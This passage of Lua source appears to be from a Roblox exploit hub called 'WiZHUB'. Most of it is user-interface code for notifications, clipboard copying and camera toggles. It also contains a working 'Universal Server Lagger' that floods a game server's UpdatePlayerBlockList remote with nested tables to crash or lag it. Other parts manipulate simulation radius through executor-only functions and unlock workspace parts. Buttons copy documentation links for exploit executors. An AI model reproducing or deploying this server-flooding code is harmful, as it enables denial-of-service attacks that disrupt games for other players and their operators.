	    local Current_Ping = string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms"
      	OrionLib:MakeNotification({
	Name = "Your ping:",
	Content = tostring(Current_Ping),
	Image = "rbxassetid://6023426945",
	Time = 5
})
  	end    
})

Setting:AddButton({
	Name = "Notify Game Place ID",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Game Place ID:",
	Content = game.PlaceId,
	Image = "rbxassetid://6023426945",
	Time = 5
})
  	end    
})

Setting:AddButton({
	Name = "Notify Game Job ID",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Game Job ID:",
	Content = game.JobId,
	Image = "rbxassetid://6023426945",
	Time = 5
})
  	end    
})

Setting:AddButton({
	Name = "Notify Position",
	Callback = function()
	    local char = plr.Character
		local pos = char and char.HumanoidRootPart or char:FindFirstChildWhichIsA("BasePart")
		pos = pos and pos.Position
		if not pos then
			return game.StarterGui:SetCore("SendNotification", {Title = "NotifyPosition Error.", Text = "Missing Character. You need to be alive not dead.", Duration = 4,})
		end
		local Current_Position = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
      	OrionLib:MakeNotification({
	Name = "Your Current Position:",
	Content = tostring(Current_Position),
	Image = "rbxassetid://6023426945",
	Time = 5
})
  	end    
})

Setting:AddButton({
	Name = "Notify CFrame",
	Callback = function()
	    local char = plr.Character
		local cpos = char and char.HumanoidRootPart or char:FindFirstChildWhichIsA("BasePart")
		cpos = cpos and cpos.CFrame
		if not cpos then
			return game.StarterGui:SetCore("SendNotification", {Title = "NotifyPosition Error.", Text = "Missing Character. You need to be alive not dead.", Duration = 4,})
		end
		local Current_CFrame = cpos
      	OrionLib:MakeNotification({
	Name = "Your Current CFrame:",
	Content = tostring(Current_CFrame),
	Image = "rbxassetid://6023426945",
	Time = 12
})
  	end    
})

Setting:AddButton({
	Name = "Copy Game Place Id",
	Callback = function()
		local gameplace = tostring(game.PlaceId)
		toClipboard(gameplace)
		OrionLib:MakeNotification({
	Name = "Copied.",
	Content = "You copied to Clipboard. Now press Control (CTRL) + V or Right Click + Paste to Paste into your exploit.",
	Image = "rbxassetid://6023426945",
	Time = 7
})
	end  
})

Setting:AddButton({
	Name = "Copy Game Job Id",
	Callback = function()
		local gameplace = game.JobId
		toClipboard(gameplace)
		OrionLib:MakeNotification({
	Name = "Copied.",
	Content = "You copied to Clipboard. Now press Control (CTRL) + V or Right Click + Paste to Paste into your exploit.",
	Image = "rbxassetid://6023426945",
	Time = 7
})
	end  
})

Setting:AddButton({
	Name = "Copy Game Place and Job Id",
	Callback = function()
		local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
	toClipboard(jobId)
		OrionLib:MakeNotification({
	Name = "Copied.",
	Content = "You copied to Clipboard. Now press Control (CTRL) + V or Right Click + Paste to Paste into your exploit.",
	Image = "rbxassetid://6023426945",
	Time = 7
})
	end  
})


Setting:AddButton({
	Name = "Copy Position",
	Callback = function()
		local char = plr.Character
		local pos = char and char.HumanoidRootPart or char:FindFirstChildWhichIsA("BasePart")
		pos = pos and pos.Position
		if not pos then
			return game.StarterGui:SetCore("SendNotification", {Title = "NotifyPosition Error.", Text = "Missing Character. You need to be alive not dead.", Duration = 4,})
		end
		local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
		toClipboard(roundedPos)
		OrionLib:MakeNotification({
	Name = "Copied",
	Content = "You copied to Clipboard. Now press Control (CTRL) + V or Right Click + Paste to Paste into your exploit.",
	Image = "rbxassetid://6023426945",
	Time = 7
})
	end  
})

Setting:AddButton({
	Name = "Copy CFrame",
	Callback = function()
		local char = plr.Character
		local pos = char and char.HumanoidRootPart or char:FindFirstChildWhichIsA("BasePart")
		pos = pos and pos.CFrame
		if not pos then
			return game.StarterGui:SetCore("SendNotification", {Title = "NotifyPosition Error.", Text = "Missing Character. You need to be alive not dead.", Duration = 4,})
		end
		local roundedPos = tostring(pos)
		toClipboard(roundedPos)
		OrionLib:MakeNotification({
	Name = "Copied",
	Content = "You copied to Clipboard. Now press Control (CTRL) + V or Right Click + Paste to Paste into your exploit.",
	Image = "rbxassetid://6023426945",
	Time = 7
})
	end  
})

Setting:AddButton({
	Name = "Unlock Workspace",
	Callback = function()
	    for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.Locked = false
		end
	end
  	end    
})

Setting:AddButton({
	Name = "Enable Backpack",
	Callback = function()
	    game.StarterGui:SetCoreGuiEnabled(2, true)
  	end    
})

Setting:AddButton({
	Name = "Enable Shiftlock",
	Callback = function()
	    game:GetService('Players').LocalPlayer.DevEnableMouseLock = true
  	end    
})

Setting:AddButton({
	Name = "FPS Unlock",
	Callback = function()
	    setfpscap(0)
  	end    
})

Setting:AddToggle({
	Name = "SimulationRadius",
	Default = false,
	Callback = function(simradi)
		if simradi == true then
               if sethidden then		
		simRadLoop = game:GetService('RunService').Stepped:Connect(function()
			if setsimulation then
				setsimulation(1e308, 1/0)
			else	
				sethidden(plr,"MaximumSimulationRadius",1/0)
				sethidden(plr,"SimulationRadius", 1e308)
			end
		end)
		simRadius = true
	end
          else
			   simradi = false
               if sethidden then		
		          if simRadLoop then 
					 simRadLoop:Disconnect() 
				  end
		wait()
		if setsimulation then
			setsimulation(139,139)
		else	
			sethidden(plr,"MaximumSimulationRadius",139)
			sethidden(plr,"SimulationRadius", 139)
		end
		simRadius = false
	end
	end
  end    
})

Setting:AddToggle({
	Name = "ThirdPerson Mode",
	Default = false,
	Callback = function(Thirdm)
		if Thirdm == true then
               game.Players.LocalPlayer.CameraMode = "Classic"
          else
			   Thirdm = false
               game.Players.LocalPlayer.CameraMode = "Classic"
	end
  end    
})

Setting:AddToggle({
	Name = "FirstPerson Mode",
	Default = false,
	Callback = function(Firstm)
		if Firstm == true then
               game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
          else
			   Firstm = false
               game.Players.LocalPlayer.CameraMode = "Classic"
	end
  end    
})

Setting:AddToggle({
	Name = "Show FPS",
	Default = false,
	Callback = function(ShowFPS)
		if ShowFPS == true then
               local ToolNameGrabber = Instance.new("ScreenGui", getParent)
	local ToolNameTxt = Instance.new("TextLabel", getParent)
	local player = cmdlp
	ToolNameGrabber.Name = "ToolNameGrabber"
	ToolNameGrabber.Parent = game.CoreGui
	ToolNameGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ToolNameGrabber.Enabled = true
	ToolNameTxt.Name = "ToolNameTxt"
	ToolNameTxt.Parent = ToolNameGrabber
	ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
	ToolNameTxt.BackgroundTransparency = 1
	ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
	ToolNameTxt.Position = UDim2.new(0.894944727, 0, 0.952606618, 0)
	ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
	ToolNameTxt.Font = Enum.Font.GothamSemibold
	ToolNameTxt.Text = "TextLabel"
	ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
	ToolNameTxt.TextScaled = true
	ToolNameTxt.TextSize = 14
	ToolNameTxt.TextWrapped = true
	ToolNameTxt.Visible = true
	local FpsLabel = ToolNameTxt
	local Heartbeat = game:GetService("RunService").Heartbeat
	local LastIteration, Start
	local FrameUpdateTable = { }
	local function HeartbeatUpdate()
		LastIteration = tick()
		for Index = #FrameUpdateTable, 1, -1 do
			FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
		end
		FrameUpdateTable[1] = LastIteration
		local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
		CurrentFPS = CurrentFPS - CurrentFPS % 1
		FpsLabel.Text = "" .. CurrentFPS .. " FPS"
	end
	Start = tick()
	Heartbeat:Connect(HeartbeatUpdate)
          else
			   ShowFPS = false
               for i,fps in pairs(game.CoreGui:GetDescendants()) do
				   if fps.Name == "ToolNameGrabber" then
					   fps:Destroy()
				   end	   
			   end
	end
  end    
})

Setting:AddToggle({
	Name = "Show Ping",
	Default = false,
	Callback = function(ShowPing)
		if ShowPing == true then
               local PingGrabber = Instance.new("ScreenGui", getParent)
	local ToolNameTxt = Instance.new("TextLabel", getParent)
	local player = cmdlp
	PingGrabber.Name = "PingGrabber"
	PingGrabber.Parent = game.CoreGui
	PingGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	PingGrabber.Enabled = true
	ToolNameTxt.Name = "ToolNameTxt"
	ToolNameTxt.Parent = PingGrabber
	ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
	ToolNameTxt.BackgroundTransparency = 1
	ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
	ToolNameTxt.Position = UDim2.new(0.8, 0, 0.952606618, 0)
	ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
	ToolNameTxt.Font = Enum.Font.GothamSemibold
	ToolNameTxt.Text = "TextLabel"
	ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
	ToolNameTxt.TextScaled = true
	ToolNameTxt.TextSize = 14
	ToolNameTxt.TextWrapped = true
	ToolNameTxt.Visible = true
	local PingLabel = ToolNameTxt
	local Heartbeat = game:GetService("RunService").Heartbeat
	local LastIteration, Start
	local FrameUpdateTable = { }
	local function HeartbeatUpdate()
		LastIteration = tick()
		for Index = #FrameUpdateTable, 1, -1 do
			FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
		end
		FrameUpdateTable[1] = LastIteration
		local Current_Ping = string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
		Current_Ping = Current_Ping - Current_Ping % 1
		PingLabel.Text = "Ping: " .. Current_Ping .. " ms"
	end
	Start = tick()
	Heartbeat:Connect(HeartbeatUpdate)
          else
			   ShowPing = false
               for i,ping in pairs(game.CoreGui:GetDescendants()) do
				   if ping.Name == "PingGrabber" then
					   ping:Destroy()
				   end	   
			   end
	end
  end    
})

Setting:AddToggle({
	Name = "Zoom Camera",
	Default = false,
	Callback = function(Zoom)
		if Zoom == true then
	local w = game.Workspace
local c = w.CurrentCamera
c.FieldOfView = 5

          else
			   Zoom = false
			   local ws = game.Workspace
local cc = ws.CurrentCamera
			   cc.FieldOfView = 70
	end
  end    
})

Setting:AddToggle({
	Name = "Show AnimationData",
	Default = false,
	Callback = function(ShowAnim)
		if ShowAnim == true then
             settings():GetService("NetworkSettings").ShowActiveAnimationAsset = true  
          else
			   ShowAnim = false
               settings():GetService("NetworkSettings").ShowActiveAnimationAsset = false
	end
  end    
})

Setting:AddToggle({
	Name = "Show HitboxData",
	Default = false,
	Callback = function(ShowHit)
		if ShowHit == true then
             settings():GetService("RenderSettings").ShowBoundingBoxes = true 
          else
			   ShowHit = false
               settings():GetService("RenderSettings").ShowBoundingBoxes = false
	end
  end    
})

Setting:AddToggle({
	Name = "Show Hitboxes",
	Default = false,
	Callback = function(ShowHits)
		if ShowHits == true then
              for _, object in next, game.Workspace:GetDescendants() do
            if object.Name == "HumanoidRootPart" and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
          else
			   ShowHits = false
               for _, object in next, game.Workspace:GetDescendants() do
            if object.Name == "HumanoidRootPart" and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

local BubChatE = game:GetService("Chat").BubbleChatEnabled

Setting:AddToggle({
	Name = "BubbleChat",
	Default = BubChatE,
	Callback = function(BubChat)
		game:GetService("Chat").BubbleChatEnabled = BubChat
  end    
})

Setting:AddToggle({
	Name = "SafeChat",
	Default = false,
	Callback = function(SafeChat)
		plr:SetSuperSafeChat(SafeChat)
  end    
})

Setting:AddToggle({
	Name = "Universal Server Lagger",
	Default = false,
	Callback = function(ShowLags)
		if ShowLags == true then
        _G.on = true
while wait(1.3) do --// don't change it's the best
   if _G.on == true then
   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
   local function getmaxvalue(val)
      local mainvalueifonetable = 499999
      if type(val) ~= "number" then
          return nil
      end
      local calculateperfectval = (mainvalueifonetable/(val+2))
      return calculateperfectval
   end
   
   local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
   
    table.insert(spammedtable, {})
    z = spammedtable[1]
   
    for i = 1, tableincrease do
       local tableins = {}
       table.insert(z, tableins)
       z = tableins
    end
   
    local calculatemax = getmaxvalue(tableincrease)
    local maximum
   
    if calculatemax then
        maximum = calculatemax
        else
        maximum = 10000
    end
   
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end
   
    for i = 1, tries do
        game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
    end
   end
   
   bomb(250, 2) --// change values if client crashes
end
   end
          else
			   ShowLags = false
               _G.on = false
	end
  end    
})

Setting:AddToggle({
	Name = "IncomingReplicationLag",
	Default = false,
	Callback = function(ShowLag)
		if ShowLag == true then
              setting = settings().Network
setting.IncomingReplicationLag = 1000
          else
			   ShowLag = false
               setting = settings().Network
setting.IncomingReplicationLag = 0
	end
  end    
})

TablePart:AddButton({
	Name = "Clear Noclip Table-Parts",
	Callback = function()
	    if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
  	end    
})

TablePart:AddButton({
	Name = "Clear Vehicle Noclip Table-Parts",
	Callback = function()
	    if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	for i,v in pairs(vnoclipParts) do
		v.CanCollide = true
	end
	vnoclipParts = {}
  	end    
})

TablePart:AddButton({
	Name = "Clear TPunAnchored FrozenParts Table-Parts",
	Callback = function()
	    for i,v in pairs(frozenParts) do
			for i,c in pairs(v:GetChildren()) do
				if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
					c:Destroy()
				end
			end
		end
		frozenParts = {}
  	end    
})

TablePart:AddButton({
	Name = "Clear Vehicle Strongthen Table-Parts",
	Callback = function()
	    for i,v in pairs(vstrongParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end	
	end
	vstrongParts = {}
  	end    
})

TablePart:AddButton({
	Name = "Clear Vehicle Weaken Table-Parts",
	Callback = function()
	    for i,v in pairs(vweakParts) do
		if v:IsA("Part") then
	       v.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end	
	end
	vweakParts = {}
  	end    
})

Math:AddLabel("Calculator")

local MathFirst
local MathSecond

Math:AddTextbox({
	Name = "First Number",
	Default = "",
	TextDisappear = true,
	Callback = function(MathFirstlol)
		MathFirst = MathFirstlol
	end		  
})

Math:AddTextbox({
	Name = "Second Number",
	Default = "",
	TextDisappear = true,
	Callback = function(MathSecondlol)
		MathSecond = MathSecondlol
	end		  
})

Math:AddDropdown({ --- Or local Dropdown = Tab:AddDropdown({
	Name = "Answer Method",
	Default = "",
	Options = {"+", "-", "*", ":"}, --- Can add more, example Options = {"1", "2", "3", "4", "5"}, also you can name of these numbers to random word or number.
	Callback = function(ChoosePart)
		if ChoosePart == "+" then --- Or "1" idk lol
            OrionLib:MakeNotification({
	Name = "Answer",
	Content = math.round(MathFirst + MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
            elseif ChoosePart == "-" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Answer",
	Content = math.round(MathFirst - MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
            elseif ChoosePart == "*" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Answer",
	Content = math.round(MathFirst * MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
            elseif ChoosePart == ":" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Answer",
	Content = math.round(MathFirst / MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
	end
  end    
})

Math:AddDropdown({ --- Or local Dropdown = Tab:AddDropdown({
	Name = "Copy Answer Method",
	Default = "",
	Options = {"+", "-", "*", ":"}, --- Can add more, example Options = {"1", "2", "3", "4", "5"}, also you can name of these numbers to random word or number.
	Callback = function(ChoosePart)
		if ChoosePart == "+" then --- Or "1" idk lol
            OrionLib:MakeNotification({
	Name = "Copied Answer",
	Content = math.round(MathFirst + MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
setclipboard(tostring(MathFirst + MathSecond))
            elseif ChoosePart == "-" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Copied Answer",
	Content = math.round(MathFirst - MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
setclipboard(tostring(MathFirst - MathSecond))
            elseif ChoosePart == "*" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Copied Answer",
	Content = math.round(MathFirst * MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
setclipboard(tostring(MathFirst * MathSecond))
            elseif ChoosePart == ":" then --- Or "2"
            OrionLib:MakeNotification({
	Name = "Copied Answer",
	Content = math.round(MathFirst / MathSecond),
	Image = "rbxassetid://6023426945",
	Time = 5
})
setclipboard(tostring(MathFirst / MathSecond))
	end
  end    
})

Math:AddLabel("Miscellaneous")

Math:AddTextbox({
	Name = "Math Square Root",
	Default = "",
	TextDisappear = true,
	Callback = function(SRQT)
		MathSqrt = SRQT
        OrionLib:MakeNotification({
	Name = "Answer",
	Content = math.sqrt(MathSqrt),
	Image = "rbxassetid://6023426945",
	Time = 5
})
	end		  
})

Math:AddButton({
	Name = "Math Pi",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Math Pi Answer",
	Content = math.pi,
	Image = "rbxassetid://6023426945",
	Time = 5
})
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy Synapse X Documentation",
	Callback = function()
      	setclipboard("https://x.synapse.to/docs/")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy KRNL Documentation",
	Callback = function()
      	setclipboard("https://pastebin.com/raw/k6XDSs5n")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy pre KRNL Documentation",
	Callback = function()
      	setclipboard("https://docs.krnl.ca/predocs.html")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy ScriptWare Documentation",
	Callback = function()
      	setclipboard("https://docs.script-ware.com/")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy Electron Documentation",
	Callback = function()
      	setclipboard("https://ryos.best/api/EDocs")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy Fluxus Documentation",
	Callback = function()
      	setclipboard("https://fluxusrbx.gitbook.io/fluxus/")
  	end    
})

ExploitDoc:AddButton({
	Name = "Copy Sirhurt V4 Documentation",
	Callback = function()
      	setclipboard("https://sirhurt.net/login/API.html")
  	end    
})

OrionLib:MakeNotification({
	Name = "Welcome to WiZHUB",
	Content = "This script is for private use, Updates are also private.",
	Image = "rbxassetid://6034925622",
	Time = 15
})

local st = tick()

print("WiZHUB loaded in", tostring(tick()-st).." seconds")

Credit:AddParagraph("Functions", "Functions is very overpowered. I will add new and other functions next time. Also I'm not creator or scripted these functions, just letting you know.")
Credit:AddParagraph("UI Library", "WiZHUB uses an Open-Source UI Library to provide the cleanest feel!")
Credit:AddParagraph("Developer/Scripter", "WiZHUB was created by @WiiZARDD. You can find my Github below, as well as the Discord Link!")
Credit:AddParagraph("New Logs", "Private RELEASE! (Aug 19, 2022) ")
Credit:AddParagraph("Change Logs", "Replaced new updated chat translator.")
Credit:AddButton({
	Name = "Copy Github Link",
	Callback = function()
      	setclipboard("https://www.github.com/WiiZARDD/")
  	end    
})

Credit:AddButton({
	Name = "Copy Discord Link",
	Callback = function()
      	setclipboard("https://discord.gg/mv3uueN4")
  	end    
})
